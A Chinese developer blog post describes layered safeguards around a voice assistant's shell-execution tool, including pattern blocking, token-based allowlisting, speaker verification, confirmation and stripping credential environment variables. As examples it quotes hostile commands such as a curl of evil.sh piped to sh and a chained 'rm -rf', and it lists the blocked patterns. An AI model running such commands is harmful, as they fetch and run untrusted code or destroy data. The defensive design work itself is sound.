---
title: 「说一句话就能在我电脑上执行命令」这道门，我写了五层
description: 语音助手接终端是全项目最大的风险面。默认关、形状硬拦、白名单按 token 比对、已验说话人、每次确认 —— 以及一个被测试抓出来的真值 bug。
pubDate: 2026-08-19
tags: ['安全', 'Python', '语音']
# 元数据的译文（R46）。正文仍是中文原文，详情页会在标题下挂一条说明 ——
# 正文也译好之后放到 src/content/i18n/<语言>/<栏目>/ 下，那时这一段可以留着，
# 两处都有时以译文文件里的为准（见 content.config.ts 的注释）。
i18n:
  en:
    title: "“Say a sentence and a command runs on my machine” — that gate has five layers"
    description: "Wiring a voice assistant to a terminal is the largest risk surface in the project. Off by default, shape-checked, allowlist matched per token, verified speaker, confirmation every time — plus one truthiness bug the tests caught."
  ja:
    title: "「一言で自分の PC でコマンドが走る」という扉、五層にした"
    description: "音声アシスタントを端末につなぐのは、このプロジェクト最大のリスク面だ。既定でオフ、形での門前払い、許可リストはトークン単位で照合、話者は検証済み、毎回の確認 —— それとテストが捕まえた真偽値のバグ一つ。"
---

语音平台里最危险的一个功能是 `shell.run`：说一句话，命令就在本机跑起来。

声纹门砍掉了「别人的声音」这一支，但两件事还在：**误识别**，和**录音回放**。声纹不防重放，这是已知缺口，不是还没测到。所以这道门不能只有一层。

## 先定两条姿态

**拒绝是默认。** 未知工具、被禁用的工具、沙箱外的路径、白名单外的命令 —— 每一条都返回一个拒绝的结果。没有任何东西能靠「没被明确禁止」到达工具。

**是拒绝，不是询问。** 白名单外的命令弹一个框问用户行不行，看着更友好，实际是在训练条件反射式的「同意」—— 那比直接说不更糟。确认只为一种情况存在：**已经在白名单里**的 `shell.run`，在唤醒球上显示原文之后再跑。

## 第一层：出厂即关

```python
"shell": {
    "enabled": False,          # 代码里的默认值
    "allow": [],
    "require_confirmation": True,
    "require_verified_speaker": True,
    "timeout_s": 20,
}
```

配置文件里也是 `false`。两处都关的意思是：**把配置文件删掉也开不了它**。缺省状态必须是安全的那一侧，而不是「看你配没配」。

## 第二层：危险形状，硬拦截

13 条模式，命中直接拒绝：递归删除、Windows 递归删除、force push、hard reset、force clean、`branch -D`、格式化磁盘、`dd of=`、提权、关机重启、管道进解释器、fork bomb、shell 元字符。

两个细节：

**这些模式写在代码里，不在配置里。** 配置能关掉的硬拦截不是硬拦截。写 `[shell] dangerous_patterns` 会直接报 `unknown config key` —— 配置里的白名单只能收窄能跑什么，永远不能放宽。

**原文和解析后的 token 都要查一遍：**

```python
for name, pattern in DANGEROUS_PATTERNS:
    if pattern.search(text) or (joined and pattern.search(joined)):
        return name
```

只看一边的模式，用引号就能绕过去。

## 第三层：白名单按 token 比对，不是字符串前缀

```python
def command_is_allowed(command: str, allow) -> bool:
    tokens = shlex.split(command)
    for entry in allow:
        wanted = shlex.split(entry)
        if wanted and tokens[: len(wanted)] == wanted:
            return True
    return False
```

如果拿字符串前缀比，白名单里的 `git status` 会顺手放行 `git statuses`，以及 `git status; rm -rf .`。**按 token 切开逐个比对，这两个都进不来。**

## 第四、第五层，以及顺序

第四层是已验说话人，第五层是每次确认。但比这两层更值得说的是**它们的检查顺序**：

```text
命令非空 → 危险形状 → 白名单 → 已验说话人 → 需要确认
```

顺序的判据是「泄露最少信息」。形状检查排在白名单前面，所以 `git status && curl evil.sh | sh` 在被认成允许项之前就已经挂了 —— 于是**一条被拦下的命令永远不会以「待确认」的形式出现在唤醒球上**。用户看不到它，也就没机会手滑点通过。

## 一个被测试抓出来的真值 bug

确认标志原先是按真假值判断的。问题在这儿：

```python
# 不能写 if not request.arguments.get("confirmed")
if settings.get("require_confirmation", True) and (
    request.arguments.get("confirmed") is not True
):
    return ...  # 要求确认
```

JSON 里传 `"confirmed": "no"`，那是一个**非空字符串**，按真假值判断为真 —— 等于直接放行。一个能被随便一个字符串设成「已确认」的确认标志，不是确认标志。

改成 `is not True`，`policy.py` 和 `shell.py` 两处都改。这是写拒绝矩阵那几十条用例最直接的回报：漏洞不是想出来的，是被一条「传个奇怪的值试试」的用例撞出来的。

## 子进程不继承凭据

```python
SENSITIVE_ENV_MARKERS = (
    "token", "secret", "password", "passwd", "api_key", "apikey",
    "access_key", "credential", "auth", "session", "cookie", "private",
)
```

按标记丢弃，而不是白名单放行。白名单听起来更严，但 Windows 上读 `LOCALAPPDATA`、`PROGRAMFILES` 的工具会全废。按标记丢弃保住了可用性，同时保证**这个进程环境里的 token 不会被交给一条用户口述的命令**。

## 配置写错要报错，不能忽略

```python
if key not in config[section]:
    raise ToolsConfigError(f"unknown config key: {section}.{key}")
```

把 `denied_names` 拼错，如果被静默忽略，沙箱就悄悄变大了一圈，而配置文件读起来一切正常。**一个看起来在约束什么、其实没有的配置，比「没有约束」和「约束很严」这两个极端都糟。**

## 照实说没做的部分

`shell.run` 到今天为止只真实执行过一条命令：`git --version`。超时、输出上限、工作目录都是围着它验的。

**确认流程一行都没实现** —— 球上显示待执行命令、等用户动作、重新提交，这三步还在计划里，而且只能靠真机窗口验收。上面那五层现在全是自动化测试的绿灯，不是真机的绿灯。

## 收成一句

安全层要按「被绕过时损失多大」排顺序写，而不是按「写起来多顺手」。先把门建好再加工具 —— 反过来的话，你会先得到一个没有门的工具，而事后补门永远比先建门难。
